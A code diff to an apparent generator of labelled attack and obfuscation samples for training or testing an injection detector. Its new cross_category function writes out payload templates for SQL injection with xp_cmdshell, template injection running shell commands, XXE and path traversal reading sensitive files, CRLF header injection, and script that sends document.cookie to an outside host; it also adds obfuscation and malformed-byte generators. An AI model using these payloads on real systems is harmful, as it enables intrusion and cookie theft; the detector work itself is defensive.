@@ -41,6 +41,7 @@ from typing import Iterable, Iterator, List, NamedTuple, Tuple
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 import attacks  # noqa: E402  (attack grammars)
+import obfuscation  # noqa: E402  (obfuscating encodings)
 import benign  # noqa: E402  (benign text, shared pools, corruption)
 
 CATEGORIES: Tuple[str, ...] = (
@@ -124,141 +125,11 @@ def has_low_control(b: bytes) -> bool:
 
 
 # --------------------------------------------------------------------------
-# Obfuscation transforms (operate on a text string, return bytes + extra mask)
+# Obfuscation transforms (see `obfuscation.py`)
 # --------------------------------------------------------------------------
 
-_FULLWIDTH_SPACE = "\u3000"
-
-
-def _to_fullwidth(s: str) -> str:
-    out = []
-    for ch in s:
-        o = ord(ch)
-        if ch == " ":
-            out.append(_FULLWIDTH_SPACE)
-        elif 0x21 <= o <= 0x7E:
-            out.append(chr(o - 0x20 + 0xFF00))
-        else:
-            out.append(ch)
-    return "".join(out)
-
-
-_HOMO = {
-    "a": "\u0430", "e": "\u0435", "o": "\u043E", "c": "\u0441",
-    "p": "\u0440", "x": "\u0445", "y": "\u0443", "i": "\u0456",
-    "s": "\u0455", "d": "\u0501", "j": "\u0458", "A": "\u0410",
-    "E": "\u0415", "O": "\u041E", "C": "\u0421", "<": "\u2039",
-    ">": "\u203A", "'": "\u2032", "/": "\u2044",
-}
-
-
-def _to_homoglyph(s: str, rng: random.Random) -> str:
-    out = []
-    for ch in s:
-        alt = _HOMO.get(ch)
-        if alt is not None and rng.random() < 0.7:
-            out.append(alt)
-        else:
-            out.append(ch)
-    return "".join(out)
-
-
-def _entity_run(s: str, rng: random.Random) -> str:
-    hexmode = rng.random() < 0.5
-    pad = rng.random() < 0.3
-    out = []
-    for ch in s:
-        o = ord(ch)
-        if hexmode:
-            if pad:
-                out.append("&#x%04X;" % o)
-            else:
-                out.append("&#x%X;" % o)
-        else:
-            if pad:
-                out.append("&#%05d;" % o)
-            else:
-                out.append("&#%d;" % o)
-    return "".join(out)
-
-
-def _escape_run(s: str, rng: random.Random) -> str:
-    style = rng.choice(("x", "x", "u", "u", "octal"))
-    out = []
-    for ch in s:
-        o = ord(ch)
-        if style == "x":
-            out.append("\\x%02x" % (o & 0xFF))
-        elif style == "u":
-            out.append("\\u%04x" % o)
-        else:
-            out.append("\\%o" % (o & 0xFF))
-    return "".join(out)
-
-
-def _u_encode(s: str) -> bytes:
-    return "".join("%%u%04X" % ord(ch) for ch in s).encode("ascii")
-
-
-def _overlong_utf8(s: str) -> bytes:
-    """Overlong 2-byte encoding of ASCII (invalid; also malformed)."""
-    out = bytearray()
-    for ch in s:
-        c = ord(ch) & 0x7F
-        out.append(0xC0 | (c >> 6))
-        out.append(0x80 | (c & 0x3F))
-    return bytes(out)
-
-
-def _sql_comment_split(s: str, rng: random.Random) -> str:
-    sep = rng.choice(("/**/", "/**/", "/*x*/", "/*!*/"))
-    out = []
-    for i, ch in enumerate(s):
-        out.append(ch)
-        if ch.isalnum() and i + 1 < len(s) and s[i + 1].isalnum() and rng.random() < 0.3:
-            out.append(sep)
-    return "".join(out)
-
-
-def _shell_quote_split(s: str, rng: random.Random) -> str:
-    out = []
-    for i, ch in enumerate(s):
-        out.append(ch)
-        if ch.isalpha() and i + 1 < len(s) and s[i + 1].isalpha() and rng.random() < 0.35:
-            out.append(rng.choice(("''", '""', "\\")))
-    return "".join(out)
-
-
-def obfuscate(text: str, rng: random.Random, inner_mask: int) -> Tuple[bytes, int]:
-    """Apply one obfuscation technique to `text`. Returns (bytes, mask)."""
-    tech = rng.choice(
-        (
-            "double_pct", "double_pct", "triple_pct", "u_encode",
-            "overlong", "entity", "escape", "escape",
-            "fullwidth", "homoglyph", "sql_split", "shell_split",
-        )
-    )
-    mask = M_OBFUSCATION | inner_mask
-    if tech == "double_pct":
-        return pct_encode_all(pct_encode_all(text)), mask
-    if tech == "triple_pct":
-        return pct_encode_all(pct_encode_all(pct_encode_all(text))), mask
-    if tech == "u_encode":
-        return _u_encode(text), mask
-    if tech == "overlong":
-        return _overlong_utf8(text), mask | M_MALFORMED
-    if tech == "entity":
-        return _entity_run(text, rng).encode("ascii"), mask
-    if tech == "escape":
-        return _escape_run(text, rng).encode("ascii"), mask
-    if tech == "fullwidth":
-        return _to_fullwidth(text).encode("utf-8"), mask
-    if tech == "homoglyph":
-        return _to_homoglyph(text, rng).encode("utf-8"), mask
-    if tech == "sql_split":
-        return _sql_comment_split(text, rng).encode("utf-8"), mask
-    # shell_split
-    return _shell_quote_split(text, rng).encode("utf-8"), mask
+obfuscate = obfuscation.obfuscate
+_overlong_utf8 = obfuscation.overlong_utf8
 
 
 # --------------------------------------------------------------------------
@@ -276,46 +147,85 @@ gen_template = attacks.gen_template
 gen_header = attacks.gen_header
 
 
+_LEGACY_CODECS = (
+    ("latin", "latin-1"), ("latin", "cp1252"), ("ko", "euc_kr"), ("ko", "cp949"), ("ja", "shift_jis"),
+    ("ja", "euc_jp"), ("zh", "gbk"), ("zh", "big5"), ("ru", "cp1251"), ("ru", "koi8_r"), ("el", "iso8859_7"),
+    ("he", "cp1255"), ("ar", "cp1256"), ("th", "tis_620"), ("vi", "cp1258"),
+)
+_MAGIC = (b"\x89PNG\r\n\x1a\n", b"PK\x03\x04", b"\x1f\x8b\x08", b"\xff\xd8\xff\xe0", b"GIF89a\x01\x00",
+          b"%PDF-1.7\n%\xe2\xe3\xcf\xd3", b"\x7fELF\x02\x01\x01", b"MZ\x90\x00", b"\xca\xfe\xba\xbe",
+          b"SQLite format 3\x00", b"\x00asm\x01\x00\x00\x00", b"BZh91AY&SY")
+
+
+def _legacy_text(rng: random.Random) -> bytes:
+    """Text in a legacy single- or double-byte encoding, which is not valid UTF-8."""
+    for _ in range(8):
+        script, codec = rng.choice(_LEGACY_CODECS)
+        text = benign.script_text(rng, script)[: rng.randint(6, 80)]
+        try:
+            data = text.encode(codec)
+        except UnicodeEncodeError:
+            data = text.encode(codec, "ignore")
+        if not valid_utf8(data):
+            return data
+    return "caf\u00e9 cr\u00e8me".encode("latin-1")
+
+
 def gen_malformed(rng: random.Random) -> Tuple[bytes, int]:
     flavor = rng.choice(
-        ("trunc", "stray", "badlead", "badsecond", "nul", "c0",
-         "badpct", "badpct", "binary", "overlong")
+        ("trunc", "stray", "badlead", "badsecond", "nul", "c0", "badpct", "badpct", "binary",
+         "overlong", "legacy", "legacy", "utf16", "magic", "ansi", "surrogate", "c1", "trunc_end",
+         "nul_run", "bad_pct_u")
     )
+    mask = M_MALFORMED
     # optional benign-ish ascii context
     ctx = ""
     if rng.random() < 0.5:
         ctx = rng.choice(PARAM_NAMES) + "="
     out = bytearray(ctx.encode("ascii"))
     if flavor == "trunc":
-        lead = rng.choice((0xE2, 0xE0, 0xF0, 0xC3, 0xED, 0xF4))
+        lead = rng.choice((0xE2, 0xE0, 0xF0, 0xC3, 0xED, 0xF4, 0xD0, 0xEA, 0xE3))
         out.append(lead)
         if rng.random() < 0.5:
-            out.append(rng.choice((0x82, 0x9F, 0x80, 0xA0)))
+            out.append(rng.choice((0x82, 0x9F, 0x80, 0xA0, 0xB0)))
+        if rng.random() < 0.5:
+            out += rand_ident(rng, 1, 6).encode()
     elif flavor == "stray":
         for _ in range(rng.randint(1, 4)):
             out.append(rng.randint(0x80, 0xBF))
     elif flavor == "badlead":
-        out.append(rng.choice((0xC0, 0xC1, 0xF5, 0xF6, 0xF7, 0xFE, 0xFF)))
-        out.append(rng.randint(0x80, 0xBF))
+        out.append(rng.choice((0xC0, 0xC1, 0xF5, 0xF6, 0xF7, 0xF8, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF)))
+        out += bytes(rng.randint(0x80, 0xBF) for _ in range(rng.randint(1, 5)))
     elif flavor == "badsecond":
-        out.append(rng.choice((0xE2, 0xF0, 0xC3)))
+        out.append(rng.choice((0xE2, 0xF0, 0xC3, 0xD0, 0xEC)))
         out.append(rng.randint(0x00, 0x7F))  # invalid continuation
     elif flavor == "nul":
         out += rand_ident(rng, 2, 6).encode()
         out.append(0x00)
         out += rand_ident(rng, 2, 6).encode()
+    elif flavor == "nul_run":
+        out += rand_ident(rng, 2, 8).encode() + b"\x00" * rng.randint(2, 24)
     elif flavor == "c0":
         out += rand_ident(rng, 2, 5).encode()
-        out.append(rng.choice((0x01, 0x02, 0x07, 0x08, 0x0B, 0x0C, 0x1B, 0x1F)))
+        out.append(rng.choice((0x01, 0x02, 0x03, 0x04, 0x07, 0x08, 0x0B, 0x0C, 0x0E, 0x10, 0x1A, 0x1B, 0x1F)))
         out += rand_ident(rng, 2, 5).encode()
+    elif flavor == "ansi":
+        out += rand_ident(rng, 2, 6).encode()
+        out += rng.choice((b"\x1b[31m", b"\x1b[0m", b"\x1b[2J", b"\x1b[1;32m", b"\x1b]0;" + rand_ident(rng, 2, 6).encode() + b"\x07",
+                           b"\x1b[H", b"\x1b[?25l", b"\x1b[K"))
+        out += rand_ident(rng, 2, 6).encode()
+    elif flavor == "c1":
+        out += rand_ident(rng, 1, 5).encode() + bytes((rng.randint(0x80, 0x9F),)) + rand_ident(rng, 1, 5).encode()
     elif flavor == "badpct":
         bad = rng.choice(
-            ("%zz", "%gg", "%4", "%2", "%", "%%", "abc%", "%2g", "%x1",
-             "a%", "foo%2", "%u", "val%ue%", "%2." )
+            ("%zz", "%gg", "%4", "%2", "%", "%%", "abc%", "%2g", "%x1", "a%", "foo%2", "%u", "val%ue%",
+             "%2.", "%G0", "%-1", "%%%", "100%", "%0", "%A", "%3z", "%+2", "%~", "%e%", "% 20")
         )
         out += bad.encode("ascii")
         if rng.random() < 0.4:
             out += rand_ident(rng, 2, 6).encode()
+    elif flavor == "bad_pct_u":
+        out += rng.choice((b"%u", b"%U", b"%u00", b"%u12G4", b"%uzzzz", b"%u0")) + rand_ident(rng, 0, 4).encode()
     elif flavor == "binary":
         n = rng.randint(4, 24)
         for _ in range(n):
@@ -323,14 +233,40 @@ def gen_malformed(rng: random.Random) -> Tuple[bytes, int]:
         # guarantee a disqualifying byte
         out[rng.randrange(len(ctx), len(out)) if len(out) > len(ctx) else -1] = rng.choice(
             (0x00, 0xFF, 0xC0, 0x1B, 0x85))
-    else:  # overlong (invalid utf-8)
-        out += _overlong_utf8(rng.choice(("..", "/", "<script>", "../etc")))
+    elif flavor == "magic":
+        out += rng.choice(_MAGIC) + bytes(rng.randint(0, 255) for _ in range(rng.randint(0, 24)))
+    elif flavor == "legacy":
+        out += _legacy_text(rng)
+    elif flavor == "utf16":
+        text = rng.choice((rand_ident(rng, 3, 12), benign.english_sentence(rng)[:40], benign.script_text(rng)[:20]))
+        out += rng.choice((b"", b"\xff\xfe", b"\xfe\xff")) + text.encode(rng.choice(("utf-16-le", "utf-16-be")))
+    elif flavor == "surrogate":
+        out += rand_ident(rng, 0, 5).encode() + bytes((0xED, rng.randint(0xA0, 0xBF), rng.randint(0x80, 0xBF)))
+        if rng.random() < 0.5:
+            out += bytes((0xED, rng.randint(0xB0, 0xBF), rng.randint(0x80, 0xBF)))
+    elif flavor == "trunc_end":
+        text = benign.script_text(rng)[: rng.randint(3, 40)].encode("utf-8")
+        leads = [i for i, c in enumerate(text) if c >= 0xC2]
+        if leads:
+            i = rng.choice(leads)
+            text = text[: i + 1]
+        out += text
+    else:  # overlong (invalid utf-8), which `obfuscation.py` also labels obfuscation
+        mask |= M_OBFUSCATION
+        out += _overlong_utf8(rng.choice(("..", "/", "<script>", "../etc", "'", "<", "%", rand_ident(rng, 1, 5))))
     b = bytes(out)
     # Make sure it is truly malformed by our test's criteria.
-    if valid_utf8(b) and not any(c < 0x20 and c not in (0x09, 0x0A, 0x0D) for c in b):
+    if not benign.is_malformed(b):
         # fall back: append a stray continuation byte
         b = b + bytes((rng.randint(0x80, 0xBF),))
-    return b, M_MALFORMED
+    return b, mask
+
+
+_OBF_TOKENS = (
+    ".", "..", "../", "/", "\\", "<", ">", "'", '"', "admin", "root", "etc/passwd", "<a>", "<b>", "SELECT", "select",
+    "union", "cat", "id", "' or", "script", "alert", "javascript", "onerror", "eval", "document.cookie",
+    "cmd", "exec", "system", "/bin/sh", "passwd", "../../", "%", "&", "=", ";", "|", "${", "{{", "\r\n",
+)
 
 
 def gen_obfuscation(rng: random.Random) -> Tuple[bytes, int]:
@@ -338,20 +274,24 @@ def gen_obfuscation(rng: random.Random) -> Tuple[bytes, int]:
     r = rng.random()
     if r < 0.55:
         # obfuscate an attack payload -> attack bit + obfuscation
-        inner_gen = rng.choice((gen_sql, gen_markup, gen_path, gen_cmd, gen_template))
+        inner_gen = rng.choice((gen_sql, gen_markup, gen_path, gen_cmd, gen_template, gen_header))
         raw, inner_mask = inner_gen(rng)
         try:
             text = raw.decode("utf-8")
         except UnicodeDecodeError:
             text = raw.decode("latin-1")
+        if rng.random() < 0.25:
+            return obfuscation.layered(text, rng, inner_mask)
         return obfuscate(text, rng, inner_mask)
-    else:
-        # obfuscate a benign-ish ASCII token -> obfuscation alone
-        token = rng.choice(
-            (rand_ident(rng, 4, 10), ".", "..", "/", "admin", "etc/passwd",
-             "<a>", "SELECT", "cat", "' or", "script", rng.choice(PARAM_NAMES))
-        )
-        return obfuscate(token, rng, 0)
+    # obfuscate a benign or neutral token -> obfuscation alone
+    token = rng.choice((
+        rand_ident(rng, 4, 10), rng.choice(_OBF_TOKENS), rng.choice(_OBF_TOKENS), rng.choice(PARAM_NAMES),
+        benign.ident(rng), benign.english_sentence(rng)[: rng.randint(4, 30)].strip() or "hello",
+        benign.posix_path(rng), benign.neutral_host(rng),
+    ))
+    if rng.random() < 0.2:
+        return obfuscation.layered(token, rng, 0)
+    return obfuscate(token, rng, 0)
 
 
 CAT_GEN = {
@@ -375,31 +315,80 @@ _ATTACK_BITS = [
 # Multi-label combiner
 # --------------------------------------------------------------------------
 
+def cross_category(rng: random.Random) -> Tuple[bytes, int]:
+    """One payload that is an attack in two categories at once."""
+    host = rand_host(rng)
+    target = attacks.rand_sensitive_file(rng)
+    up = rng.choice(("../", "..\\", "..%2f", "%2e%2e/")) * rng.randint(2, 8)
+    js = rng.choice(("alert(1)", "alert(document.domain)", f"fetch('//{host}/'+document.cookie)", "prompt(%d)" % rng.randint(0, 99)))
+    q = rng.choice(("'", "\"", ""))
+    kind = rng.randint(0, 9)
+    if kind == 0:  # command reads a traversed file
+        return (f"{rng.choice((';', '|', '&&', '`'))} {rng.choice(('cat', 'type', 'head', 'tail', 'more'))} {up}{target}").encode(), M_CMD | M_PATH
+    if kind == 1:  # SQL returns markup
+        return (f"{q} {attacks.kw(rng, 'union')} {attacks.kw(rng, 'select')} '<script>{js}</script>'{rng.choice(('--', '#', '-- -'))}").encode(), M_SQL | M_MARKUP
+    if kind == 2:  # SQL reads a traversed file
+        return (f"{q} {attacks.kw(rng, 'union')} {attacks.kw(rng, 'select')} {attacks.kw(rng, 'load_file')}('{up}{target}'){rng.choice(('--', '#'))}").encode(), M_SQL | M_PATH
+    if kind == 3:  # template runs a command
+        cmd = rng.choice(("id", "whoami", "cat /etc/passwd", "curl http://%s/" % host))
+        return rng.choice((f"{{{{''.__class__.__mro__[1].__subclasses__()[{rng.randint(40, 400)}]('{cmd}',shell=True)}}}}; {cmd}",
+                           f"${{T(java.lang.Runtime).getRuntime().exec('{cmd}')}}`{cmd}`")).encode(), M_TEMPLATE | M_CMD
+    if kind == 4:  # response splitting with a script body
+        nl = rng.choice(("%0d%0a", "\r\n", "%0a"))
+        return (f"{attacks.rand_word(rng)}{nl}Content-Type: text/html{nl}{nl}<script>{js}</script>").encode(), M_HEADER | M_MARKUP
+    if kind == 5:  # XML external entity that reads a traversed file
+        e = attacks.rand_ident(rng, 2, 5)
+        return (f"<!DOCTYPE r [<!ENTITY {e} SYSTEM \"file://{up}{target}\">]><r>&{e};</r>").encode(), M_MARKUP | M_PATH
+    if kind == 6:  # markup that loads a template
+        return (f"<img src=x onerror=\"{js}\">{{{{{rng.randint(2, 99)}*{rng.randint(2, 99)}}}}}").encode(), M_MARKUP | M_TEMPLATE
+    if kind == 7:  # traversal inside a template include
+        return (f"{{% include '{up}{target}' %}}").encode(), M_TEMPLATE | M_PATH
+    if kind == 8:  # SQL stacked with a shell command
+        return (f"{q}; {attacks.kw(rng, 'exec')} master..xp_cmdshell '{rng.choice(('whoami', 'ping ' + host))}'--| {rng.choice(('id', 'whoami'))}").encode(), M_SQL | M_CMD
+    # header injection carrying a traversal location
+    nl = rng.choice(("%0d%0a", "\r\n"))
+    return (f"{nl}Location: /{up}{target}").encode(), M_HEADER | M_PATH
+
+
 def combine(rng: random.Random, payload: bytes, mask: int) -> Tuple[bytes, int]:
-    options = ["append"]
+    options = ["append", "append", "cross"]
     can_text = valid_utf8(payload) and not has_low_control(payload)
     if not (mask & M_MALFORMED):
-        options += ["nul", "ctrl"]
+        options += ["nul", "ctrl", "bad_utf8"]
         if can_text:
-            options += ["obf", "obf", "overlong"]
+            options += ["obf", "obf", "layered", "overlong"]
     choice = rng.choice(options)
     if choice == "append":
         other_bit = rng.choice([b for b in _ATTACK_BITS if b not in (M_OBFUSCATION,) and not (mask & b)] or _ATTACK_BITS)
         raw, m2 = CAT_GEN[other_bit](rng)
-        sep = rng.choice((" ", "&" + rng.choice(PARAM_NAMES) + "=", "; ", "|", "/"))
-        return payload + sep.encode("latin-1", "ignore") + raw, mask | m2
+        sep = rng.choice((" ", "&" + rng.choice(PARAM_NAMES) + "=", "; ", "|", "/", "", "\n", ","))
+        if rng.random() < 0.5:
+            return payload + sep.encode("latin-1", "ignore") + raw, mask | m2
+        return raw + sep.encode("latin-1", "ignore") + payload, mask | m2
+    if choice == "cross":
+        raw, m2 = cross_category(rng)
+        return raw, m2
     if choice == "nul":
         pos = rng.randint(0, len(payload))
-        return payload[:pos] + b"\x00" + payload[pos:], mask | M_MALFORMED
+        return payload[:pos] + b"\x00" * rng.choice((1, 1, 1, 2, 4)) + payload[pos:], mask | M_MALFORMED
     if choice == "ctrl":
         pos = rng.randint(0, len(payload))
-        c = bytes((rng.choice((0x01, 0x07, 0x08, 0x0B, 0x1B)),))
+        c = bytes((rng.choice((0x01, 0x07, 0x08, 0x0B, 0x0C, 0x1B, 0x1F)),))
         return payload[:pos] + c + payload[pos:], mask | M_MALFORMED
+    if choice == "bad_utf8":
+        pos = rng.randint(0, len(payload))
+        junk = rng.choice((b"\xc0", b"\xff", b"\xfe", b"\x80", b"\xe2\x82", b"\xed\xa0\x80", b"\xf8\x88\x80\x80\x80"))
+        return payload[:pos] + junk + payload[pos:], mask | M_MALFORMED
     if choice == "overlong":
         text = payload.decode("utf-8")
+        cut = rng.randint(1, len(text))
+        if rng.random() < 0.5:
+            return _overlong_utf8(text[:cut]) + text[cut:].encode("utf-8"), mask | M_OBFUSCATION | M_MALFORMED
         return _overlong_utf8(text[: rng.randint(1, len(text))]) + payload, mask | M_OBFUSCATION | M_MALFORMED
-    # obf: wrap whole payload with an obfuscation technique
     text = payload.decode("utf-8")
+    if choice == "layered":
+        return obfuscation.layered(text, rng, mask)
+    # obf: wrap whole payload with an obfuscation technique
     return obfuscate(text, rng, mask)
 
 
@@ -733,24 +722,28 @@ def _encoding_pair(rng: random.Random, pid: int) -> List[Record]:
         text = benign.pair_source_value(rng)
         raw = text.encode("utf-8")
         single = pct_encode(raw, space_as_plus=rng.random() < 0.5)
-        tech = rng.choice(("double", "double", "triple", "u", "entity", "escape"))
+        tech = rng.choice(("double", "double", "triple", "partial", "u", "entity", "entity", "escape", "escape", "css"))
         if tech in ("double", "triple"):
             first = single if b"%" in single else b"".join(b"%%%02X" % c for c in raw)
             obf = pct_encode(first)
             if tech == "triple":
                 obf = pct_encode(obf)
+        elif tech == "partial":
+            obf = obfuscation.partial_double_pct(text, rng)
         elif tech == "u":
-            obf = _u_encode(text)
+            obf = obfuscation.u_encode(text, rng)
         elif tech == "entity":
-            obf = _entity_run(text, rng).encode("ascii")
+            obf = obfuscation.entity_run(text, rng).encode("utf-8")
+        elif tech == "escape":
+            obf = obfuscation.escape_run(text, rng).encode("utf-8")
         else:
-            obf = _escape_run(text, rng).encode("ascii")
+            obf = obfuscation.css_escape_run(text, rng).encode("utf-8")
         (o_obf, o_single, o_plain), car = embed_many(rng, [obf, single, raw], M_OBFUSCATION, allow_encode=False)
         if len(o_obf) > MAX_LEN:
             continue
         out = [Record(o_obf, M_OBFUSCATION, "obf_pair", pid, car)]
         plain_ok = car in ("bare", "prose", "json", "header:ua") and not any(c in b"%&=#+;" for c in raw)
-        prefer_plain = tech in ("entity", "escape")
+        prefer_plain = tech in ("entity", "escape", "css")
         cands = [o_plain, o_single] if (prefer_plain and plain_ok) else [o_single, o_plain] if plain_ok else [o_single]
         for cand in cands:
             if len(cand) <= MAX_LEN and benign.benign_ok(cand):
